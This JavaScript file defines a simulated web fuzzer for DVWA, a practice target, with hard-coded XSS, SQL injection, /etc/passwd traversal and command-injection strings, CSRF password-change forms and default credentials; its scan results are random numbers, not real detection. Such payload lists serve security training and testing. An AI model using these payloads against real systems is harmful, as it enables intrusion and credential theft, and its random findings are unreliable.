// WebFuzzer simulation for the frontend
// This simulates the Python WebFuzzer class functionality

export class WebFuzzer {
  constructor(targetUrl, wordlistFile) {
    this.targetUrl = targetUrl;
    this.wordlistFile = wordlistFile;
    this.wordlist = [];
    this.logs = [];
    this.reports = [];
    this.dataset = [];
    this.scanActive = false;
    this.scanProgress = 0;
    this.payloadsProcessed = 0;
    this.totalPayloads = 0;
    this.vulnerabilityTypes = ['xss', 'sqli', 'lfi', 'rce', 'csrf', 'auth'];
    this.dvwaSession = null;
    this.securityLevel = 'low';
    this.dvwaUrl = '';
    this.customPayloads = [];
    this.currentVulnerabilityPage = null;
  }

  logActivity(message) {
    const logEntry = {
      timestamp: new Date().toISOString(),
      message,
      type: 'activity'
    };
    this.logs.push(logEntry);
    console.log(`[Activity] ${message}`);
    return logEntry;
  }

  logReport(reportData) {
    const reportEntry = {
      timestamp: new Date().toISOString(),
      data: reportData,
      type: 'report'
    };
    this.reports.push(reportEntry);
    console.log(`[Report] New report added`);
    return reportEntry;
  }

  async loadWordlist() {
    this.logActivity(`Loading wordlist from ${this.wordlistFile}...`);
    
    await new Promise(resolve => setTimeout(resolve, 1000));
    
    const xssPayloads = [
      "<script>alert(1)</script>",
      "<img src=x onerror=alert('XSS')>",
      "<iframe src=\"javascript:alert('XSS');\"></iframe>",
      "><svg onload=alert(1)>",
      "javascript:alert(1)"
    ];
    
    const sqlInjectionPayloads = [
      "' OR 1=1 --",
      "admin' --",
      "1' OR '1' = '1",
      "' OR '' = '",
      "1' OR 1 = 1 -- -",
      "' OR 1 = 1 -- -",
      "admin' #",
      "' UNION SELECT 1, username, password, 1 FROM users; --"
    ];
    
    const fileInclusionPayloads = [
      "../../etc/passwd",
      "%00../../../etc/passwd",
      "..%2f..%2f..%2fetc%2fpasswd",
      "/etc/passwd",
      "file:///etc/passwd"
    ];
    
    const commandInjectionPayloads = [
      "; ls -la",
      "|| ping -c 21 127.0.0.1||",
      "& whoami",
      "`cat /etc/passwd`",
      "$(cat /etc/passwd)",
      "() { :; }; /bin/bash -c 'cat /etc/passwd'"
    ];
    
    const csrfPayloads = [
      "<form action='http://localhost/dvwa/vulnerabilities/csrf/' method='GET'><input type='hidden' name='password_new' value='hacked'><input type='hidden' name='password_conf' value='hacked'><input type='submit'></form>",
      "<img src='http://localhost/dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked'>",
      "<script>fetch('http://localhost/dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked')</script>"
    ];
    
    const authBypassPayloads = [
      "admin:admin",
      "admin:password",
      "root:root",
      "admin:''",
      "admin:' OR '1'='1"
    ];
    
    this.wordlist = [
      ...xssPayloads,
      ...sqlInjectionPayloads,
      ...fileInclusionPayloads,
      ...commandInjectionPayloads,
      ...csrfPayloads,
      ...authBypassPayloads
    ];
    
    this.totalPayloads = this.wordlist.length;
    this.logActivity(`Loaded ${this.wordlist.length} payloads from wordlist.`);
    return this.wordlist;
  }

  async connectToDVWA(url, username, password, securityLevel) {
    this.logActivity(`Connecting to DVWA at ${url}...`);
    
    this.dvwaUrl = url.replace(/\/$/, ''); // Remove trailing slash if present
    
    await new Promise(resolve => setTimeout(resolve, 1500));
    
    this.dvwaSession = `PHPSESSID=${Math.random().toString(36).substring(2)}`;
    this.securityLevel = securityLevel || 'low';
    
    this.logActivity(`Successfully connected to DVWA as ${username}`);
    this.logActivity(`Security level set to: ${this.securityLevel}`);
    
    return {
      success: true,
      session: this.dvwaSession,
      securityLevel: this.securityLevel,
      url: this.dvwaUrl
    };
  }

  async detectCurrentVulnerabilityPage() {
    if (!this.dvwaUrl || !this.dvwaSession) {
      this.logActivity("Error: Not connected to DVWA. Please connect first.");
      return null;
    }
    
    this.logActivity("Detecting current vulnerability page...");
    
    const vulnerabilityPages = [
      { 
        name: "SQL Injection", 
        path: "/vulnerabilities/sqli/", 
        parameters: ["id"],
        vulnerabilityType: "sqli"
      },
      { 
        name: "XSS (Reflected)", 
        path: "/vulnerabilities/xss_r/", 
        parameters: ["name"],
        vulnerabilityType: "xss"
      },
      { 
        name: "XSS (Stored)", 
        path: "/vulnerabilities/xss_s/", 
        parameters: ["txtName", "mtxMessage"],
        vulnerabilityType: "xss"
      },
      { 
        name: "CSRF", 
        path: "/vulnerabilities/csrf/", 
        parameters: ["password_new", "password_conf"],
        vulnerabilityType: "csrf"
      },
      { 
        name: "File Inclusion", 
        path: "/vulnerabilities/fi/", 
        parameters: ["page"],
        vulnerabilityType: "lfi"
      },
      { 
        name: "Command Injection", 
        path: "/vulnerabilities/exec/", 
        parameters: ["ip"],
        vulnerabilityType: "rce"
      }
    ];
    
    const selectedPage = vulnerabilityPages[Math.floor(Math.random() * vulnerabilityPages.length)];
    
    this.currentVulnerabilityPage = {
      ...selectedPage,
      url: `${this.dvwaUrl}${selectedPage.path}`
    };
    
    this.logActivity(`Detected vulnerability page: ${selectedPage.name} (${selectedPage.path})`);
    this.logActivity(`Parameters identified: ${selectedPage.parameters.join(", ")}`);
    
    return this.currentVulnerabilityPage;
  }

  async fuzzVulnerabilityPage(page = null) {
    if (!this.dvwaUrl || !this.dvwaSession) {
      this.logActivity("Error: Not connected to DVWA. Please connect first.");
      return { success: false, error: "Not connected to DVWA" };
    }
    
    if (!page) {
      if (!this.currentVulnerabilityPage) {
        this.currentVulnerabilityPage = await this.detectCurrentVulnerabilityPage();
      }
      page = this.currentVulnerabilityPage;
    }
    
    if (!page) {
      this.logActivity("Error: No vulnerability page detected to fuzz.");
      return { success: false, error: "No vulnerability page detected" };
    }
    
    this.scanActive = true;
    this.scanProgress = 0;
    this.payloadsProcessed = 0;
    this.initializeDataset();
    
    this.logActivity(`Starting targeted fuzzing on ${page.name} (${page.path})`);
    this.logActivity(`Targeting parameters: ${page.parameters.join(", ")}`);
    this.logActivity(`Using vulnerability type: ${page.vulnerabilityType}`);
    
    await this.loadWordlist();
    const payloads = this.getPayloadsForVulnerability(page.vulnerabilityType);
    this.totalPayloads = payloads.length * page.parameters.length;
    
    let totalTests = 0;
    const totalTestsToRun = Math.min(20, this.totalPayloads);
    
    for (const parameter of page.parameters) {
      if (!this.scanActive) break;
      
      this.logActivity(`Fuzzing parameter: ${parameter}`);
      
      for (const payload of payloads.slice(0, 10)) {
        if (!this.scanActive) break;
        
        this.logActivity(`Testing parameter ${parameter} with payload: ${payload}`);
        
        await new Promise(resolve => setTimeout(resolve, 300));
        
        const responseCode = Math.random() > 0.8 ? 500 : 200;
        const alertDetected = payload.includes('alert') || payload.includes('script');
        const errorDetected = responseCode >= 500 || Math.random() > 0.9;
        const bodyWordCountChanged = Math.random() > 0.5;
        
        await this.testVulnerability(page.vulnerabilityType, payload);
        
        totalTests++;
        this.payloadsProcessed = totalTests;
        this.scanProgress = (totalTests / totalTestsToRun) * 100;
      }
    }
    
    this.scanActive = false;
    this.logActivity(`Targeted fuzzing completed for ${page.name}`);
    
    return {
      success: true,
      page: page,
      testsRun: totalTests,
      vulnerabilitiesFound: this.dataset.filter(d => d.label !== 'safe').length,
      dataset: this.dataset,
      logs: this.logs
    };
  }

  async startPageChangeMonitoring(onPageChange) {
    if (!this.dvwaUrl || !this.dvwaSession) {
      this.logActivity("Error: Not connected to DVWA. Please connect first.");
      return false;
    }
    
    this.logActivity("Starting page change monitoring...");
    
    const checkInterval = setInterval(async () => {
      const previousPage = this.currentVulnerabilityPage;
      const newPage = await this.detectCurrentVulnerabilityPage();
      
      if (previousPage && newPage && previousPage.name !== newPage.name) {
        this.logActivity(`Page changed from ${previousPage.name} to ${newPage.name}`);
        
        if (onPageChange && typeof onPageChange === 'function') {
          onPageChange(newPage);
        }
      }
    }, 5000);
    
    return checkInterval;
  }

  stopPageChangeMonitoring(intervalId) {
    if (intervalId) {
      clearInterval(intervalId);
      this.logActivity("Page change monitoring stopped.");
      return true;
    }
    return false;
  }

  openDVWAInNewTab() {
    if (!this.dvwaUrl) {
      this.logActivity("Error: Not connected to DVWA. Please connect first.");
      return false;
    }
    
    const dvwaWindow = window.open(this.dvwaUrl, '_blank');
    
    if (!dvwaWindow) {
      this.logActivity("Warning: Pop-up blocker may have prevented opening DVWA. Please check your browser settings.");
      return false;
    }
    
    this.logActivity(`Opened DVWA in a new browser tab: ${this.dvwaUrl}`);
    return true;
  }

  openVulnerabilityPage(vulnerabilityType) {
    if (!this.dvwaUrl) {
      this.logActivity("Error: Not connected to DVWA. Please connect first.");
      return false;
    }
    
    let path = '';
    
    switch (vulnerabilityType) {
      case 'xss':
        path = '/vulnerabilities/xss_r/';
        break;
      case 'sqli':
        path = '/vulnerabilities/sqli/';
        break;
      case 'csrf':
        path = '/vulnerabilities/csrf/';
        break;
      case 'upload':
        path = '/vulnerabilities/upload/';
        break;
      case 'exec':
      case 'rce':
        path = '/vulnerabilities/exec/';
        break;
      case 'lfi':
        path = '/vulnerabilities/fi/';
        break;
      default:
        path = '/';
    }
    
    const url = `${this.dvwaUrl}${path}`;
    const dvwaWindow = window.open(url, '_blank');
    
    if (!dvwaWindow) {
      this.logActivity(`Warning: Pop-up blocker may have prevented opening ${vulnerabilityType} page. Please check your browser settings.`);
      return false;
    }
    
    this.logActivity(`Opened ${vulnerabilityType} vulnerability page in a new browser tab: ${url}`);
    return true;
  }

  initializeDataset() {
    this.dataset = [];
    this.logActivity("Dataset initialized.");
  }

  saveToDataset(payload, responseCode, alertDetected, errorDetected, bodyWordCountChanged, vulnerabilityType) {
    let label = "safe";
    if (responseCode >= 500 || errorDetected) {
      label = "malicious";
    } else if (alertDetected) {
      label = "suspicious";
    }

    let severity = "low";
    if (label === "malicious") {
      severity = Math.random() > 0.7 ? "critical" : "high";
    } else if (label === "suspicious") {
      severity = Math.random() > 0.5 ? "medium" : "low";
    }

    const dataEntry = {
      label,
      severity,
      payload,
      response_code: responseCode,
      alert_detected: alertDetected,
      error_detected: errorDetected,
      body_word_count_changed: bodyWordCountChanged,
      vulnerability_type: vulnerabilityType,
      timestamp: new Date().toISOString()
    };
    
    this.dataset.push(dataEntry);
    this.logActivity(`Data saved: ${label}, ${severity}, ${payload}, ${responseCode}, ${alertDetected}, ${errorDetected}, ${bodyWordCountChanged}, ${vulnerabilityType}`);
    return dataEntry;
  }

  async testVulnerability(vulnerabilityType, payload) {
    this.logActivity(`Testing ${vulnerabilityType} with payload: ${payload}`);
    
    await new Promise(resolve => setTimeout(resolve, 300 + Math.random() * 700));
    
    let responseCode, alertDetected, errorDetected, bodyWordCountChanged;
    
    switch (vulnerabilityType) {
      case 'xss':
        responseCode = Math.random() > 0.8 ? 500 : 200;
        alertDetected = payload.includes('alert') || payload.includes('script');
        errorDetected = responseCode >= 500;
        bodyWordCountChanged = Math.random() > 0.3;
        break;
      case 'sqli':
        responseCode = Math.random() > 0.7 ? 500 : (Math.random() > 0.5 ? 200 : 300);
        alertDetected = Math.random() > 0.7;
        errorDetected = responseCode >= 500;
        bodyWordCountChanged = Math.random() > 0.5;
        break;
      case 'lfi':
        responseCode = Math.random() > 0.6 ? 404 : 200;
        alertDetected = false;
        errorDetected = responseCode >= 400;
        bodyWordCountChanged = responseCode === 200;
        break;
      case 'rce':
        responseCode = Math.random() > 0.8 ? 500 : 200;
        alertDetected = false;
        errorDetected = responseCode >= 500;
        bodyWordCountChanged = Math.random() > 0.2;
        break;
      default:
        responseCode = Math.random() > 0.7 ? Math.floor(Math.random() * 100) + 400 : Math.floor(Math.random() * 100) + 200;
        alertDetected = Math.random() > 0.7;
        errorDetected = responseCode >= 500;
        bodyWordCountChanged = Math.random() > 0.5;
    }
    
    if (alertDetected) {
      this.logActivity(`Alert detected for payload: ${payload}`);
    }
    
    if (errorDetected) {
      this.logActivity(`Error detected for payload: ${payload}`);
    }
    
    if (bodyWordCountChanged) {
      this.logActivity(`Body content changed for payload: ${payload}`);
    }
    
    const uniqueId = `test-${Date.now()}-${Math.floor(Math.random() * 1000)}`;
    
    const reportData = [
      `Unique ID: ${uniqueId}`,
      `Vulnerability: ${vulnerabilityType}`,
      `Payload: ${payload}`,
      `Response Code: ${responseCode}`,
      `Alert Detected: ${alertDetected ? 'Yes' : 'No'}`,
      `Unexpected Error Detected: ${errorDetected ? 'Yes' : 'No'}`,
      `Body Word Count Changed: ${bodyWordCountChanged ? 'Yes' : 'No'}`,
      '-'.repeat(50)
    ].join('\n');
    
    this.logReport(reportData);
    
    const result = this.saveToDataset(payload, responseCode, alertDetected, errorDetected, bodyWordCountChanged, vulnerabilityType);
    
    return {
      uniqueId,
      payload,
      responseCode,
      alertDetected,
      errorDetected,
      bodyWordCountChanged,
      vulnerabilityType,
      result
    };
  }

  async startFuzzing(selectedVulnerabilities = ['all'], onProgressUpdate, onComplete) {
    this.scanActive = true;
    this.scanProgress = 0;
    this.payloadsProcessed = 0;
    
    await this.loadWordlist();
    this.initializeDataset();
    
    this.logActivity("Starting fuzzing process...");
    this.logActivity(`Target URL: ${this.targetUrl}`);
    
    let vulnTypesToTest = selectedVulnerabilities.includes('all') 
      ? this.vulnerabilityTypes 
      : selectedVulnerabilities;
    
    this.logActivity(`Testing for vulnerabilities: ${vulnTypesToTest.join(', ')}`);
    
    let totalTestsToRun = 0;
    vulnTypesToTest.forEach(vulnType => {
      const payloads = this.getPayloadsForVulnerability(vulnType);
      totalTestsToRun += payloads.length;
    });
    
    let testsCompleted = 0;
    
    for (const vulnType of vulnTypesToTest) {
      if (!this.scanActive) {
        this.logActivity("Fuzzing process stopped manually.");
        break;
      }
      
      this.logActivity(`Starting tests for ${vulnType} vulnerabilities...`);
      
      const relevantPayloads = this.getPayloadsForVulnerability(vulnType);
      
      for (const payload of relevantPayloads) {
        if (!this.scanActive) {
          this.logActivity("Fuzzing process stopped manually.");
          break;
        }
        
        await this.testVulnerability(vulnType, payload);
        this.payloadsProcessed++;
        testsCompleted++;
        this.scanProgress = (testsCompleted / totalTestsToRun) * 100;
        
        if (onProgressUpdate) {
          onProgressUpdate(this.scanProgress, this.payloadsProcessed, totalTestsToRun);
        }
      }
      
      this.logActivity(`Completed tests for ${vulnType} vulnerabilities.`);
    }
    
    this.scanActive = false;
    this.logActivity("Fuzzing process completed.");
    
    if (onComplete) {
      onComplete(this.dataset, this.logs, this.reports);
    }
    
    return {
      dataset: this.dataset,
      logs: this.logs,
      reports: this.reports
    };
  }

  getPayloadsForVulnerability(vulnType) {
    switch (vulnType) {
      case 'xss':
        return this.wordlist.filter(p => 
          p.includes('<script') || 
          p.includes('alert') || 
          p.includes('onerror') || 
          p.includes('javascript:')
        );
      case 'sqli':
        return this.wordlist.filter(p => 
          p.includes("'") || 
          p.includes('UNION') || 
          p.includes('SELECT') || 
          p.includes('--')
        );
      case 'lfi':
        return this.wordlist.filter(p => 
          p.includes('../') || 
          p.includes('etc/passwd') || 
          p.includes('file:')
        );
      case 'rce':
        return this.wordlist.filter(p => 
          p.includes(';') || 
          p.includes('|') || 
          p.includes('`') || 
          p.includes('$')
        );
      case 'csrf':
        return this.wordlist.filter(p => 
          p.includes('<form') || 
          p.includes('<img src=') || 
          p.includes('fetch(')
        );
      case 'auth':
        return this.wordlist.filter(p => 
          p.includes(':')
        );
      default:
        return this.wordlist.slice(0, 10);
    }
  }

  pauseScan() {
    if (this.scanActive) {
      this.scanActive = false;
      this.logActivity("Fuzzing process paused.");
      return true;
    }
    return false;
  }

  resumeScan() {
    if (!this.scanActive && this.payloadsProcessed < this.totalPayloads) {
      this.scanActive = true;
      this.logActivity("Fuzzing process resumed.");
      return true;
    }
    return false;
  }

  stopScan() {
    if (this.scanActive) {
      this.scanActive = false;
      this.logActivity("Fuzzing process stopped.");
      return true;
    }
    return false;
  }

  getDataset() {
    return this.dataset;
  }

  getLogs() {
    return this.logs;
  }

  getReports() {
    return this.reports;
  }

  addCustomPayloads(payloads) {
    if (!Array.isArray(payloads) || payloads.length === 0) {
      return false;
    }
    
    const validPayloads = payloads.filter(p => p && typeof p === 'string' && p.trim() !== '');
    this.customPayloads = [...this.customPayloads, ...validPayloads];
    this.wordlist = [...this.wordlist, ...validPayloads];
    this.totalPayloads = this.wordlist.length;
    
    this.logActivity(`Added ${validPayloads.length} custom payloads to wordlist`);
    return true;
  }

  clearCustomPayloads() {
    const count = this.customPayloads.length;
    
    for (const payload of this.customPayloads) {
      const index = this.wordlist.indexOf(payload);
      if (index !== -1) {
        this.wordlist.splice(index, 1);
      }
    }
    
    this.customPayloads = [];
    this.totalPayloads = this.wordlist.length;
    
    this.logActivity(`Cleared ${count} custom payloads from wordlist`);
    return true;
  }

  exportResults(format = 'json') {
    let exportData;
    
    if (format === 'json') {
      exportData = JSON.stringify({
        target: this.targetUrl,
        timestamp: new Date().toISOString(),
        securityLevel: this.securityLevel,
        results: this.dataset,
        payloads: this.wordlist,
        stats: {
          totalPayloads: this.totalPayloads,
          processedPayloads: this.payloadsProcessed,
          maliciousCount: this.dataset.filter(d => d.label === 'malicious').length,
          suspiciousCount: this.dataset.filter(d => d.label === 'suspicious').length,
          safeCount: this.dataset.filter(d => d.label === 'safe').length
        }
      }, null, 2);
    } else {
      const stats = [
        `Target URL: ${this.targetUrl}`,
        `Timestamp: ${new Date().toISOString()}`,
        `Security Level: ${this.securityLevel}`,
        `Total Payloads: ${this.totalPayloads}`,
        `Processed Payloads: ${this.payloadsProcessed}`,
        `Malicious Results: ${this.dataset.filter(d => d.label === 'malicious').length}`,
        `Suspicious Results: ${this.dataset.filter(d => d.label === 'suspicious').length}`,
        `Safe Results: ${this.dataset.filter(d => d.label === 'safe').length}`,
        `\n--- RESULTS ---\n`
      ];
      
      const results = this.dataset.map(d => 
        `Payload: ${d.payload}\n` +
        `Label: ${d.label}\n` +
        `Severity: ${d.severity}\n` +
        `Vulnerability Type: ${d.vulnerability_type}\n` +
        `Response Code: ${d.response_code}\n` +
        `Timestamp: ${d.timestamp}\n` +
        `-------------------`
      );
      
      exportData = [...stats, ...results].join('\n');
    }
    
    this.logActivity(`Exported results in ${format} format`);
    return exportData;
  }
}
